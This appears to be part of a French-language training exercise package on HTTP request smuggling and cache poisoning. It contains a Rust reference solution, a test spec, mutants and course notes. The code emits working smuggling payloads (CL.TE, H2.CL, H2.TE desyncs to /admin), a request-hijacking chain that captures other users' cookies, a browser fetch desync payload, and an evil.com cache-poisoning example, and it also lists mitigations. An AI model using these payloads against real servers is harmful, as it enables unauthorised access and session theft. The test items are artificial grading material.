    // Generic host header attacks
    attacks.push(json!({
        "attack_type": "Host Header SSRF",
        "payload": "Host: internal-service.local",
        "description": "Access internal services via host header routing",
        "severity": "HIGH"
    }));

    attacks
}

fn generate_chained_attacks(
    smuggling_type: &SmugglingType,
    unkeyed_headers: &[String],
    has_cache: bool,
) -> Vec<Value> {
    let mut chains = Vec::new();

    // Smuggling + Cache Poisoning
    if !matches!(smuggling_type, SmugglingType::NotVulnerable) && has_cache && !unkeyed_headers.is_empty() {
        chains.push(json!({
            "name": "Smuggling + Cache Poison",
            "steps": [
                format!("Use {} to smuggle request with malicious headers", smuggling_type.as_str()),
                format!("Inject unkeyed header: {}", unkeyed_headers.first().unwrap_or(&"X-Forwarded-Host".to_string())),
                "Smuggled request targets cacheable endpoint",
                "Backend generates response with malicious content",
                "Cache stores poisoned response for all users"
            ],
            "severity": "CRITICAL",
            "impact": "Persistent XSS affecting all cached page visitors"
        }));
    }

    // Smuggling for access control bypass
    if !matches!(smuggling_type, SmugglingType::NotVulnerable) {
        chains.push(json!({
            "name": "Smuggling + Access Control Bypass",
            "steps": [
                "Identify protected endpoint (e.g., /admin)",
                format!("Craft {} smuggling payload", smuggling_type.as_str()),
                "Smuggle request with internal IP in X-Forwarded-For",
                "Backend processes smuggled request as internal",
                "Access control bypassed"
            ],
            "severity": "HIGH",
            "impact": "Unauthorized access to protected resources"
        }));
    }

    // Request hijacking for credential theft
    if !matches!(smuggling_type, SmugglingType::NotVulnerable) {
        chains.push(json!({
            "name": "Request Hijacking + Credential Theft",
            "steps": [
                format!("Send {} smuggling payload", smuggling_type.as_str()),
                "Smuggled prefix: 'GET /log?data='",
                "Next user's request appended to attacker's",
                "User's cookies/headers captured in log endpoint",
                "Attacker retrieves stolen credentials"
            ],
            "severity": "CRITICAL",
            "impact": "Session hijacking of other users"
        }));
    }

    chains
}

fn generate_mitigations(smuggling_type: &SmugglingType, unkeyed_headers: &[String]) -> Vec<String> {
    let mut mitigations = Vec::new();

    // Always include general mitigations
    mitigations.push("Use HTTP/2 end-to-end to prevent protocol-level smuggling".to_string());
    mitigations.push("Normalize request parsing across all components".to_string());
    mitigations.push("Reject ambiguous requests with both Content-Length and Transfer-Encoding".to_string());

    // Type-specific mitigations
    match smuggling_type {
        SmugglingType::ClTe => {
            mitigations.push("Configure frontend to strip Transfer-Encoding from requests".to_string());
            mitigations.push("Ensure backend rejects requests with both CL and TE headers".to_string());
        }
        SmugglingType::TeCl => {
            mitigations.push("Configure frontend to normalize chunked encoding".to_string());
            mitigations.push("Reject requests where Content-Length doesn't match body size".to_string());
        }
        SmugglingType::TeTe => {
            mitigations.push("Reject any obfuscated Transfer-Encoding variants".to_string());
            mitigations.push("Whitelist only 'Transfer-Encoding: chunked' exactly".to_string());
        }
        SmugglingType::NotVulnerable => {}
    }

    // Cache-specific mitigations
    if !unkeyed_headers.is_empty() {
        mitigations.push("Include all security-relevant headers in cache key".to_string());
        mitigations.push(format!(
            "Add to cache key: {}",
            unkeyed_headers.join(", ")
        ));
        mitigations.push("Use Vary header to prevent header-based poisoning".to_string());
    }

    // Additional hardening
    mitigations.push("Implement request timeout to detect smuggling probes".to_string());
    mitigations.push("Monitor for unusual Content-Length/Transfer-Encoding combinations".to_string());
    mitigations.push("Deploy WAF rules to detect smuggling patterns".to_string());

    mitigations
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_cl_te_detection() {
        let input = r#"{
            "architecture": {"frontend": "Nginx", "backend": "Apache", "cache": null},
            "test_results": {
                "cl_te_test": {"response_delay": true, "timeout_seconds": 5},
                "te_cl_test": {"response_delay": false}
            },
            "unkeyed_headers": [],
            "target_endpoints": []
        }"#;

        let result = http_smuggling_cache_attacks(input);
        assert!(result.contains("CL.TE"));
    }

    #[test]
    fn test_no_vulnerability() {
        let input = r#"{
            "architecture": {"frontend": "Nginx", "backend": "Nginx", "cache": null},
            "test_results": {
                "cl_te_test": {"response_delay": false},
                "te_cl_test": {"response_delay": false}
            },
            "unkeyed_headers": [],
            "target_endpoints": []
        }"#;

        let result = http_smuggling_cache_attacks(input);
        assert!(result.contains("NOT_VULNERABLE") || result.contains("NONE"));
    }
}
```

### 4.4 Solutions alternatives acceptÃ©es

```rust
// Alternative 1: Approche avec state machine pour parsing HTTP
pub fn http_smuggling_cache_attacks_state_machine(input_json: &str) -> String {
    // Utilise un automate pour parser les headers HTTP
    // et dÃ©tecter les incohÃ©rences
    // ...
}

// Alternative 2: Approche avec pattern matching explicite
pub fn http_smuggling_cache_attacks_patterns(input_json: &str) -> String {
    // Utilise des patterns prÃ©dÃ©finis pour chaque type de smuggling
    // Plus facile Ã  maintenir et Ã©tendre
    // ...
}
```

### 4.5 Solutions refusÃ©es (avec explications)

```rust
// âŒ REFUSÃ‰: Ne gÃ©nÃ¨re pas de payloads exploitables
pub fn smuggling_bad_no_payloads(input_json: &str) -> String {
    // DÃ©tecte le type mais ne gÃ©nÃ¨re aucun payload
    // Inutile pour comprendre l'exploitation
    json!({"type": "CL.TE"}).to_string()
}
// Pourquoi: L'exercice demande des payloads fonctionnels pour l'apprentissage

// âŒ REFUSÃ‰: Hardcode les rÃ©sultats
pub fn smuggling_bad_hardcoded(input_json: &str) -> String {
    // Toujours retourne CL.TE sans analyser l'input
    json!({"smuggling_analysis": {"vulnerability_type": "CL.TE"}}).to_string()
}
// Pourquoi: Ne respecte pas les test_results fournis

// âŒ REFUSÃ‰: Ignore les mitigations
pub fn smuggling_bad_no_mitigations(input_json: &str) -> String {
    // DÃ©tecte et exploite mais ne propose aucune mitigation
    // ...
}
// Pourquoi: L'aspect dÃ©fensif est crucial pour la formation
```

### 4.6 Solution bonus de rÃ©fÃ©rence

```rust
pub fn http2_smuggling_advanced(input_json: &str) -> String {
    #[derive(Deserialize)]
    struct H2Input {
        http2_enabled: bool,
        downgrade_behavior: String,
        h2_cl_test: Option<H2ClTest>,
        h2_te_test: Option<H2TeTest>,
        frontend_controls: Option<FrontendControls>,
    }

    #[derive(Deserialize)]
    struct H2ClTest {
        injected_cl: String,
        response_truncated: bool,
    }

    #[derive(Deserialize)]
    struct H2TeTest {
        chunked_accepted: bool,
    }

    #[derive(Deserialize)]
    struct FrontendControls {
        blocked_paths: Vec<String>,
        blocked_methods: Vec<String>,
    }

    let input: H2Input = match serde_json::from_str(input_json) {
        Ok(i) => i,
        Err(e) => return json!({"error": e.to_string()}).to_string(),
    };

    let mut h2_vulnerabilities = json!({});
    let mut request_tunneling = json!({});
    let mut browser_powered = json!({});

    // H2.CL Detection
    if let Some(h2_cl) = &input.h2_cl_test {
        if h2_cl.response_truncated {
            h2_vulnerabilities["h2_cl_desync"] = json!({
                "vulnerable": true,
                "payload": ":method: POST\n:path: /\ncontent-length: 0\n\nGET /admin HTTP/1.1\r\nHost: internal\r\n\r\n",
                "bypass": "Frontend path restriction bypassed via H2 â†’ H1 desync",
                "technique": "Inject Content-Length in HTTP/2 pseudo-headers"
            });
        }
    }

    // H2.TE Detection
    if let Some(h2_te) = &input.h2_te_test {
        if h2_te.chunked_accepted && input.downgrade_behavior == "h2_to_h1" {
            h2_vulnerabilities["h2_te_desync"] = json!({
                "vulnerable": true,
                "payload": ":method: POST\n:path: /\ntransfer-encoding: chunked\n\n0\r\n\r\nGET /internal HTTP/1.1\r\n\r\n",
                "bypass": "Chunked encoding preserved in downgrade"
            });
        }
    }

    // Request Tunneling Analysis
    if let Some(controls) = &input.frontend_controls {
        let mut capabilities = Vec::new();

        if !controls.blocked_paths.is_empty() {
            capabilities.push("Path restriction bypass");
        }
        if !controls.blocked_methods.is_empty() {
            capabilities.push("Method restriction bypass");
        }
        capabilities.push("Header injection");

        request_tunneling = json!({
            "technique": "Encapsulated HTTP/1.1 in HTTP/2 body",
            "capabilities": capabilities,
            "example": {
                "blocked_path": controls.blocked_paths.first(),
                "bypass_payload": format!(
                    "POST / HTTP/2\nBody: GET {} HTTP/1.1\\r\\n\\r\\n",
                    controls.blocked_paths.first().unwrap_or(&"/admin".to_string())
                )
            }
        });
    }

    // Browser-Powered Smuggling
    if input.http2_enabled {
        browser_powered = json!({
            "fetch_payload": "fetch('/', {method: 'POST', body: smuggled_http1_request, duplex: 'half'})",
            "same_origin_exploit": true,
            "technique": "Browser initiates HTTP/2 request that causes H1 desync",
            "prerequisites": ["Victim visits attacker page", "Same-origin or CORS misconfiguration"],
            "impact": "Client-side request smuggling without server control"
        });
    }

    json!({
        "h2_vulnerabilities": h2_vulnerabilities,
        "request_tunneling": request_tunneling,
        "browser_powered": browser_powered,
        "recommendations": [
            "Disable HTTP/1.1 on backend when using HTTP/2 frontend",
            "Validate Content-Length consistency in HTTP/2",
            "Strip Transfer-Encoding from HTTP/2 â†’ HTTP/1.1 downgrades",
            "Implement request timeout at all layers"
        ]
    }).to_string()
}
```

### 4.7 Solutions alternatives bonus

```rust
// Alternative: Approche avec graphe d'attaques
pub fn http2_smuggling_attack_graph(input_json: &str) -> String {
    // Construit un graphe de toutes les possibilitÃ©s d'attaque
    // et trouve le chemin optimal
    // ...
}
```

### 4.8 Solutions refusÃ©es bonus

```rust
// âŒ REFUSÃ‰: Ne gÃ¨re pas HTTP/2 spÃ©cifiquement
pub fn http2_bad_no_h2(input_json: &str) -> String {
    // RÃ©utilise simplement la logique HTTP/1.1
    http_smuggling_cache_attacks(input_json)
}
// Pourquoi: Le bonus exige spÃ©cifiquement les attaques H2
```

### 4.9 spec.json

```json
{
  "name": "http_smuggling_cache_attacks",
  "language": "rust",
  "version": "edition2024",
  "type": "code",
  "tier": 1,
  "tier_info": "Concept isolÃ© - HTTP Smuggling & Cache Poisoning",
  "tags": ["security", "http", "smuggling", "cache", "web", "phase3"],
  "passing_score": 70,

  "function": {
    "name": "http_smuggling_cache_attacks",
    "prototype": "pub fn http_smuggling_cache_attacks(input_json: &str) -> String",
    "return_type": "String",
    "parameters": [
      {"name": "input_json", "type": "&str"}
    ]
  },

  "driver": {
    "reference": "pub fn ref_http_smuggling_cache_attacks(input_json: &str) -> String { let input: serde_json::Value = serde_json::from_str(input_json).unwrap_or_default(); let cl_te = input[\"test_results\"][\"cl_te_test\"][\"response_delay\"].as_bool().unwrap_or(false); let te_cl = input[\"test_results\"][\"te_cl_test\"][\"response_delay\"].as_bool().unwrap_or(false); let vuln_type = if cl_te { \"CL.TE\" } else if te_cl { \"TE.CL\" } else { \"NOT_VULNERABLE\" }; serde_json::json!({\"smuggling_analysis\": {\"vulnerability_type\": vuln_type, \"confidence\": if cl_te || te_cl { \"HIGH\" } else { \"NONE\" }}, \"exploit_payloads\": [], \"cache_poisoning\": {\"vulnerable_headers\": input[\"unkeyed_headers\"]}, \"host_header_attacks\": [], \"chained_attacks\": [], \"mitigations\": [\"Use HTTP/2 end-to-end\"]}).to_string() }",

    "edge_cases": [
      {
        "name": "cl_te_detected",
        "args": ["{\"architecture\":{\"frontend\":\"Nginx\",\"backend\":\"Apache\",\"cache\":null},\"test_results\":{\"cl_te_test\":{\"response_delay\":true,\"timeout_seconds\":5},\"te_cl_test\":{\"response_delay\":false}},\"unkeyed_headers\":[],\"target_endpoints\":[\"/admin\"]}"],
        "expected_contains": "CL.TE",
        "is_trap": false
      },
      {
        "name": "te_cl_detected",
        "args": ["{\"architecture\":{\"frontend\":\"HAProxy\",\"backend\":\"NodeJS\",\"cache\":null},\"test_results\":{\"cl_te_test\":{\"response_delay\":false},\"te_cl_test\":{\"response_delay\":true,\"timeout_seconds\":10}},\"unkeyed_headers\":[],\"target_endpoints\":[]}"],
        "expected_contains": "TE.CL",
        "is_trap": false
      },
      {
        "name": "no_smuggling",
        "args": ["{\"architecture\":{\"frontend\":\"Nginx\",\"backend\":\"Nginx\",\"cache\":null},\"test_results\":{\"cl_te_test\":{\"response_delay\":false},\"te_cl_test\":{\"response_delay\":false}},\"unkeyed_headers\":[],\"target_endpoints\":[]}"],
        "expected_contains": ["NOT_VULNERABLE", "NONE"],
        "is_trap": true,
        "trap_explanation": "Pas de dÃ©lai = pas de vulnÃ©rabilitÃ©"
      },
      {
        "name": "cache_poisoning_unkeyed",
        "args": ["{\"architecture\":{\"frontend\":\"CloudFront\",\"backend\":\"Origin\",\"cache\":\"CloudFront\"},\"test_results\":{\"cl_te_test\":{\"response_delay\":false},\"te_cl_test\":{\"response_delay\":false}},\"unkeyed_headers\":[\"X-Forwarded-Host\"],\"target_endpoints\":[\"/home\"]}"],
        "expected_contains": "X-Forwarded-Host",
        "is_trap": false
      },
      {
        "name": "empty_architecture",
        "args": ["{\"architecture\":{},\"test_results\":{},\"unkeyed_headers\":[],\"target_endpoints\":[]}"],
        "expected_contains": ["error", "NONE", "NOT_VULNERABLE"],
        "is_trap": true,
        "trap_explanation": "Input invalide doit Ãªtre gÃ©rÃ© gracieusement"
      },
      {
        "name": "invalid_json",
        "args": ["not valid json"],
        "expected_contains": "error",
        "is_trap": true,
        "trap_explanation": "JSON invalide doit retourner une erreur"
      }
    ],

    "fuzzing": {
      "enabled": true,
      "iterations": 500,
      "generators": [
        {
          "type": "object",
          "param_index": 0,
          "params": {
            "schema": {
              "architecture": {"type": "object"},
              "test_results": {"type": "object"},
              "unkeyed_headers": {"type": "array", "items": "string"},
              "target_endpoints": {"type": "array", "items": "string"}
            }
          }
        }
      ]
    }
  },

  "norm": {
    "allowed_functions": ["serde_json::*", "std::collections::*", "regex::*"],
    "forbidden_functions": ["reqwest::*", "hyper::*", "std::net::*"],
    "check_security": true,
    "check_memory": true,
    "blocking": true
  },

  "security_checks": {
    "cwe_mapping": ["CWE-444", "CWE-525", "CWE-352"],
    "owasp_category": "A05:2021-Security Misconfiguration"
  }
}
```

### 4.10 Solutions Mutantes

```rust
// Mutant A (Boundary): Confusion entre CL.TE et TE.CL
pub fn mutant_a_boundary(input_json: &str) -> String {
    let input: Value = serde_json::from_str(input_json).unwrap_or_default();

    // BUG: Inverse la dÃ©tection CL.TE et TE.CL
    let cl_te = input["test_results"]["te_cl_test"]["response_delay"]  // ERREUR: mauvais test
        .as_bool().unwrap_or(false);
    let te_cl = input["test_results"]["cl_te_test"]["response_delay"]  // ERREUR: inversÃ©
        .as_bool().unwrap_or(false);

    let vuln_type = if cl_te { "CL.TE" } else if te_cl { "TE.CL" } else { "NOT_VULNERABLE" };

    json!({"smuggling_analysis": {"vulnerability_type": vuln_type}}).to_string()
}
// Pourquoi c'est faux: Confond les deux types de smuggling
// Ce qui Ã©tait pensÃ©: "CL.TE" et "TE.CL" ont la mÃªme logique

// Mutant B (Safety): Ne valide pas l'input JSON
pub fn mutant_b_safety(input_json: &str) -> String {
    // BUG: Panic sur JSON invalide au lieu de gÃ©rer l'erreur
    let input: Value = serde_json::from_str(input_json).unwrap();  // PANIC!

    json!({"smuggling_analysis": {"vulnerability_type": "CL.TE"}}).to_string()
}
// Pourquoi c'est faux: Crash sur input invalide
// Ce qui Ã©tait pensÃ©: L'input sera toujours du JSON valide

// Mutant C (Resource): GÃ©nÃ¨re des payloads mal formÃ©s
pub fn mutant_c_resource(input_json: &str) -> String {
    // BUG: Payload sans \r\n corrects
    let payload = "POST / HTTP/1.1\nHost: target.com\nContent-Length: 10\nTransfer-Encoding: chunked\n\n0\n\n";

    json!({
        "smuggling_analysis": {"vulnerability_type": "CL.TE"},
        "exploit_payloads": [{"payload": payload}]  // ERREUR: \n au lieu de \r\n
    }).to_string()
}
// Pourquoi c'est faux: HTTP requiert CRLF (\r\n), pas juste LF (\n)
// Ce qui Ã©tait pensÃ©: Les sauts de ligne sont interchangeables

// Mutant D (Logic): Ignore les unkeyed headers pour cache poisoning
pub fn mutant_d_logic(input_json: &str) -> String {
    let input: Value = serde_json::from_str(input_json).unwrap_or_default();

    // BUG: Retourne toujours "pas de cache poisoning" mÃªme avec unkeyed headers
    json!({
        "smuggling_analysis": {"vulnerability_type": "NOT_VULNERABLE"},
        "cache_poisoning": {
            "vulnerable_headers": [],  // ERREUR: Ignore input.unkeyed_headers
            "impact": "No cache poisoning possible"
        }
    }).to_string()
}
// Pourquoi c'est faux: Les unkeyed headers sont cruciaux pour cache poisoning
// Ce qui Ã©tait pensÃ©: Cache poisoning nÃ©cessite obligatoirement du smuggling

// Mutant E (Return): Mauvaise structure de retour
pub fn mutant_e_return(input_json: &str) -> String {
    // BUG: Retourne une structure incomplÃ¨te
    json!({
        "type": "CL.TE"  // ERREUR: Devrait Ãªtre smuggling_analysis.vulnerability_type
    }).to_string()
}
// Pourquoi c'est faux: La structure de sortie ne correspond pas au format attendu
// Ce qui Ã©tait pensÃ©: Seul le type de smuggling est important

// Mutant F (Edge Case): Ne dÃ©tecte pas TE.TE avec obfuscation
pub fn mutant_f_edge_case(input_json: &str) -> String {
    let input: Value = serde_json::from_str(input_json).unwrap_or_default();

    // BUG: Ignore complÃ¨tement te_te_test
    let cl_te = input["test_results"]["cl_te_test"]["response_delay"]
        .as_bool().unwrap_or(false);
    let te_cl = input["test_results"]["te_cl_test"]["response_delay"]
        .as_bool().unwrap_or(false);

    // ERREUR: Pas de vÃ©rification de te_te_test.obfuscation_variants
    let vuln_type = if cl_te { "CL.TE" } else if te_cl { "TE.CL" } else { "NOT_VULNERABLE" };

    json!({"smuggling_analysis": {"vulnerability_type": vuln_type}}).to_string()
}
// Pourquoi c'est faux: TE.TE est une variante valide mais non dÃ©tectÃ©e
// Ce qui Ã©tait pensÃ©: Seuls CL.TE et TE.CL existent
```

---

## ğŸ§  SECTION 5 : COMPRENDRE

### 5.1 Ce que cet exercice enseigne

| Concept | Description |
|---------|-------------|
| **HTTP Request Smuggling** | Exploitation des diffÃ©rences de parsing HTTP |
| **CL.TE vs TE.CL** | Deux variantes principales selon la prioritÃ© des headers |
| **Cache Poisoning** | Injection de contenu malveillant dans le cache |
| **Unkeyed Headers** | Headers non inclus dans la clÃ© de cache |
| **Attaques chaÃ®nÃ©es** | Combinaison de plusieurs vulnÃ©rabilitÃ©s |
| **Architecture Web** | Comprendre les proxies et caches |

### 5.2 LDA â€” Traduction en franÃ§ais

```
FONCTION http_smuggling_cache_attacks QUI RETOURNE UNE CHAÃNE ET PREND EN PARAMÃˆTRE input_json QUI EST UNE RÃ‰FÃ‰RENCE VERS UNE CHAÃNE
DÃ‰BUT FONCTION
    DÃ‰CLARER input COMME RÃ‰SULTAT DU PARSING JSON DE input_json

    SI input EST UNE ERREUR ALORS
        RETOURNER UN JSON D'ERREUR
    FIN SI

    DÃ‰CLARER smuggling_type COMME RÃ‰SULTAT DE detect_smuggling_type(input.test_results)

    SI input.test_results.cl_te_test.response_delay EST VRAI ALORS
        AFFECTER "CL.TE" Ã€ smuggling_type
        AFFECTER "Timing-based detection" Ã€ detection_method
    SINON SI input.test_results.te_cl_test.response_delay EST VRAI ALORS
        AFFECTER "TE.CL" Ã€ smuggling_type
    SINON SI input.test_results.te_te_test A DES VARIANTS AVEC response_diff VRAI ALORS
        AFFECTER "TE.TE" Ã€ smuggling_type
    SINON
        AFFECTER "NOT_VULNERABLE" Ã€ smuggling_type
    FIN SI

    DÃ‰CLARER exploit_payloads COMME RÃ‰SULTAT DE generate_exploit_payloads(smuggling_type, input.target_endpoints)
    DÃ‰CLARER cache_poisoning COMME RÃ‰SULTAT DE analyze_cache_poisoning(input.unkeyed_headers)
    DÃ‰CLARER host_attacks COMME RÃ‰SULTAT DE analyze_host_header(input)
    DÃ‰CLARER chained COMME RÃ‰SULTAT DE generate_chained_attacks(smuggling_type, input)
    DÃ‰CLARER mitigations COMME RÃ‰SULTAT DE generate_mitigations(smuggling_type)

    RETOURNER LE JSON CONTENANT TOUTES LES ANALYSES
FIN FONCTION
```

### 5.2.2 Logic Flow

```
ALGORITHME : HTTP Smuggling Detection & Exploitation
---
1. PARSER l'input JSON avec gestion d'erreur

2. DÃ‰TECTION du type de smuggling :
   a. SI cl_te_test.response_delay == true :
      â†’ Type = CL.TE (Frontend=CL, Backend=TE)

   b. SINON SI te_cl_test.response_delay == true :
      â†’ Type = TE.CL (Frontend=TE, Backend=CL)

   c. SINON SI te_te_test a des variants avec diff :
      â†’ Type = TE.TE (Obfuscation)

   d. SINON :
      â†’ Type = NOT_VULNERABLE

3. GÃ‰NÃ‰RATION des payloads selon le type :
   - CL.TE : Construire payload avec CL > body rÃ©el
   - TE.CL : Construire payload avec chunk malformÃ©
   - TE.TE : Utiliser les variants d'obfuscation

4. ANALYSE du cache poisoning :
   - Identifier les unkeyed headers
   - GÃ©nÃ©rer les payloads de poisoning

5. ANALYSE des attaques Host Header

6. CHAÃNAGE des attaques si multiple vulnÃ©rabilitÃ©s

7. GÃ‰NÃ‰RATION des mitigations

8. RETOURNER le rapport complet en JSON
```

### 5.2.3 ReprÃ©sentation Algorithmique (Logique de Garde)

```
FONCTION : detect_smuggling_type(test_results)
---
INIT result = NOT_VULNERABLE

1. VÃ‰RIFIER cl_te_test.response_delay :
   |
   |-- SI response_delay == true :
   |     RETOURNER CL.TE avec HIGH confidence
   |
   |-- SINON : continuer

2. VÃ‰RIFIER te_cl_test.response_delay :
   |
   |-- SI response_delay == true :
   |     RETOURNER TE.CL avec HIGH confidence
   |
   |-- SINON : continuer

3. VÃ‰RIFIER te_te_test.obfuscation_variants :
   |
   |-- POUR CHAQUE variant :
   |     SI variant.response_diff == true :
   |       RETOURNER TE.TE avec MEDIUM confidence
   |
   |-- SINON : continuer

4. RETOURNER NOT_VULNERABLE avec NONE confidence
```

### Diagramme Mermaid : Flux de DÃ©tection

```mermaid
graph TD
    A[Input: test_results] --> B{CL.TE delay?}
    B -- Oui --> C[Type: CL.TE<br/>Confidence: HIGH]
    B -- Non --> D{TE.CL delay?}

    D -- Oui --> E[Type: TE.CL<br/>Confidence: HIGH]
    D -- Non --> F{TE.TE variants?}

    F -- Oui --> G{response_diff?}
    G -- Oui --> H[Type: TE.TE<br/>Confidence: MEDIUM]
    G -- Non --> I[Type: NOT_VULNERABLE]
    F -- Non --> I

    C --> J[Generate CL.TE Payload]
    E --> K[Generate TE.CL Payload]
    H --> L[Generate TE.TE Payload]
    I --> M[No Exploitation]

    J --> N[Analyze Cache Poisoning]
    K --> N
    L --> N
    M --> N

    N --> O{Unkeyed headers?}
    O -- Oui --> P[Generate Cache Poison]
    O -- Non --> Q[Skip Cache Poison]

    P --> R[Chain Attacks]
    Q --> R

    R --> S[Generate Mitigations]
    S --> T[Output JSON Report]
```

### 5.3 Visualisation ASCII

```
                    HTTP REQUEST SMUGGLING - CL.TE
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

     ATTACKER                FRONTEND (Nginx)              BACKEND (Apache)
     â”€â”€â”€â”€â”€â”€â”€â”€                â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€             â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
         â”‚                         â”‚                             â”‚
         â”‚  POST / HTTP/1.1        â”‚                             â”‚
         â”‚  Host: target.com       â”‚                             â”‚
         â”‚  Content-Length: 44     â”‚  â—„â”€â”€â”€ Nginx lit CL=44       â”‚
         â”‚  Transfer-Encoding:     â”‚                             â”‚
         â”‚    chunked              â”‚                             â”‚
         â”‚                         â”‚                             â”‚
         â”‚  0                      â”‚                             â”‚
         â”‚                         â”‚                             â”‚
         â”‚  GET /admin HTTP/1.1    â”‚  â—„â”€â”€â”€ Ces 30 octets sont    â”‚
         â”‚  Host: target.com       â”‚       "le body" pour Nginx  â”‚
         â”‚                         â”‚                             â”‚
         â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶                             â”‚
         â”‚                         â”‚                             â”‚
         â”‚                         â”‚  Nginx forward tout         â”‚
         â”‚                         â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶
         â”‚                         â”‚                             â”‚
         â”‚                         â”‚         Apache lit TE=chunked
         â”‚                         â”‚         "0" = fin du chunk
         â”‚                         â”‚         GET /admin reste dans
         â”‚                         â”‚         le buffer...
         â”‚                         â”‚                             â”‚
         â”‚                         â”‚                             â”‚
   VICTIME                         â”‚                             â”‚
     â”‚  GET /home HTTP/1.1         â”‚                             â”‚
     â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶                             â”‚
     â”‚                         â”‚   â”‚                             â”‚
     â”‚                         â”‚   â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶
     â”‚                         â”‚   â”‚                             â”‚
     â”‚                         â”‚   â”‚   Apache prÃ©fixe la requÃªte
     â”‚                         â”‚   â”‚   de la victime avec
     â”‚                         â”‚   â”‚   GET /admin !
     â”‚                         â”‚   â”‚                             â”‚
     â”‚  â—„â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
     â”‚  RÃ©ponse de /admin                                        â”‚
     â”‚  (accÃ¨s non autorisÃ©!)                                    â”‚



                         CACHE POISONING FLOW
â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    ATTACKER              CDN/CACHE               ORIGIN SERVER
       â”‚                     â”‚                         â”‚
       â”‚  GET /home          â”‚                         â”‚
       â”‚  X-Forwarded-Host:  â”‚                         â”‚
       â”‚    evil.com         â”‚                         â”‚
       â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶                         â”‚
       â”‚                     â”‚                         â”‚
       â”‚                     â”‚  Cache Key: /home       â”‚
       â”‚                     â”‚  (X-Forwarded-Host      â”‚
       â”‚                     â”‚   NOT in cache key!)    â”‚
       â”‚                     â”‚                         â”‚
       â”‚                     â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶
       â”‚                     â”‚                         â”‚
       â”‚                     â”‚  Origin uses            â”‚
       â”‚                     â”‚  X-Forwarded-Host       â”‚
       â”‚                     â”‚  in response:           â”‚
       â”‚                     â”‚                         â”‚
       â”‚                     â—€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
       â”‚                     â”‚  <a href="//evil.com">  â”‚
       â”‚                     â”‚                         â”‚
       â”‚  â—€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                         â”‚
       â”‚                     â”‚                         â”‚
       â”‚                     â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”    â”‚
       â”‚                     â”‚  â”‚ CACHE STORES:   â”‚    â”‚
       â”‚                     â”‚  â”‚ Key: /home      â”‚    â”‚
       â”‚                     â”‚  â”‚ Value: page     â”‚    â”‚
       â”‚                     â”‚  â”‚ with evil.com   â”‚    â”‚
       â”‚                     â”‚  â”‚ links!          â”‚    â”‚
       â”‚                     â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜    â”‚
       â”‚                     â”‚                         â”‚
  VICTIM                     â”‚                         â”‚
       â”‚  GET /home          â”‚                         â”‚
       â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¶                         â”‚
       â”‚                     â”‚                         â”‚
       â”‚                     â”‚  Cache HIT!             â”‚
       â”‚  â—€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                         â”‚
       â”‚  Poisoned response                            â”‚
       â”‚  with evil.com!                               â”‚
```

### 5.4 Les piÃ¨ges en dÃ©tail

| PiÃ¨ge | Description | Comment l'Ã©viter |
|-------|-------------|------------------|
| **Confondre CL.TE et TE.CL** | Les deux types ont des logiques inverses | Bien comprendre quel composant utilise quel header |
| **Oublier CRLF** | HTTP utilise `\r\n`, pas `\n` | Toujours utiliser `\r\n` dans les payloads |
| **Ignorer TE.TE** | Variante avec obfuscation souvent oubliÃ©e | Tester les variants comme `Transfer-Encoding: xchunked` |
| **Cache key confusion** | Mal comprendre ce qui est keyed/unkeyed | Analyser la configuration du cache |
| **Timing inconsistant** | Les dÃ©lais peuvent varier | Effectuer plusieurs tests et moyenner |

### 5.5 Cours Complet

#### 5.5.1 Les Fondamentaux du HTTP

Le protocole HTTP/1.1 dÃ©finit deux mÃ©thodes pour indiquer la taille du body :

**Content-Length :**
```http
POST /login HTTP/1.1
Host: example.com
Content-Length: 27

username=admin&password=xyz
```

**Transfer-Encoding: chunked :**
```http
POST /upload HTTP/1.1
Host: example.com
Transfer-Encoding: chunked

1b
